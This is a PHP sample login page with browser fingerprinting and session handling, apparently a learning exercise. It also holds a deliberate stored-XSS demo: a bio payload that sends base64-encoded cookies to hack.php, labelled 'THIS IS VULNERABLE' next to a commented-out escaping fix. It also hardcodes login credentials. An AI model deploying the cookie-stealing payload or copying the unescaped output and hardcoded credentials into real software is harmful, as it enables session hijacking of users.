<?php
include 'libs/load.php';

$user = "bro";
$pass1 = "bro";

// Logout
if (isset($_GET['logout'])) {
    if (Session::isset("session_token")) {
        $Session = new UserSession(Session::get("session_token"));
        if ($Session->removeSession()) {
            echo "<h3>Previous Session removed from DB.</h3>";
        }
    }
    Session::destroy();
    die("Session destroyed, <a href='sample.php'>Login Again</a>");
}

// Step 1: Fingerprint capture (only once)
if (!Session::isset("fingerprint")) {
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['fingerprint'])) {
        Session::set("fingerprint", $_POST['fingerprint']);
        header("Location: " . $_SERVER['PHP_SELF']); // prevent resubmit on reload
        exit;
    } else {
        ?>
        <!doctype html>
        <html lang="en">
        <head>
            <meta charset="utf-8">
            <title>Fingerprint Detection</title>
        </head>
        <body>
            <form method="post" id="fp-form" style="display:none;">
                <input type="hidden" name="fingerprint" id="fingerprint">
            </form>

            <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
            <script>
                FingerprintJS.load()
                    .then(fp => fp.get())
                    .then(result => {
                        const visitorId = result.visitorId;
                        console.log("Fingerprint ID:", visitorId); // ✅ Console only
                        document.getElementById('fingerprint').value = visitorId;
                        document.getElementById('fp-form').submit();
                    })
                    .catch(error => {
                        console.error("Fingerprint error:", error);
                        document.getElementById('fingerprint').value = "unknown";
                        document.getElementById('fp-form').submit();
                    });
            </script>
        </body>
        </html>
        <?php
        exit;
    }
}

// Step 2: Login
try {
    if (Session::isset("session_token")) {
        if (UserSession::authorize(Session::get("session_token"))) {
            $sessionToken = Session::get("session_token");
            $session = new UserSession($sessionToken);
            $userobj = $session->getUser();
            echo "<h1>Session Login, WELCOME " . htmlspecialchars($userobj->getUsername()) . "</h1>";
        } else {
            Session::destroy();
            die("<h1>Invalid Session, <a href='sample.php'>Login Again</a></h1>");
        }
    } else {
        $pass = $pass1;
        $fingerprint = Session::get("fingerprint") ?? 'unknown';

        // (Optional) You can pass fingerprint to authenticate() if needed
        // echo "<p>Fingerprint (for debug): " . htmlspecialchars($fingerprint) . "</p>";

        if (!$pass) die("<h1>Password is Empty</h1>");

        $token = UserSession::authenticate($user, $pass, $fingerprint); // support fingerprint param if needed
        if ($token) {
            echo "<h1>New LOGIN Success, WELCOME $user</h1>";
            $session = new UserSession($token);
            $userobj = $session->getUser();
        } else {
            die("<h1>New Login Failed! $user</h1>");
        }
    }?>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<?
    echo "DOB: " . $userobj->getDob() . "<br>";
    $userobj->setDob(2003, 10, 17);
    echo "Updated DOB: " . $userobj->getDob() . "<br>";
    echo "BIO: " . $userobj->getbio() . "<br>";
    // $bio = ("<script>alert(document.cookie);</script>");
    $bio = "<script>$.get(\"hack.php?hacked_cookie=\" + btoa(document.cookie));</script>";
    $userobj->setbio($bio); // => THIS IS VULNERABLE 
    // $userobj->setbio(htmlspecialchars($bio)); # THIS WILL TREAT ANYTHING AS A CHARACTER


    echo '<br><br><a href="sample.php?logout">Logout</a>';
} catch (Exception $e) {
    echo "<h2>Error: " . htmlspecialchars($e->getMessage()) . "</h2>";
}
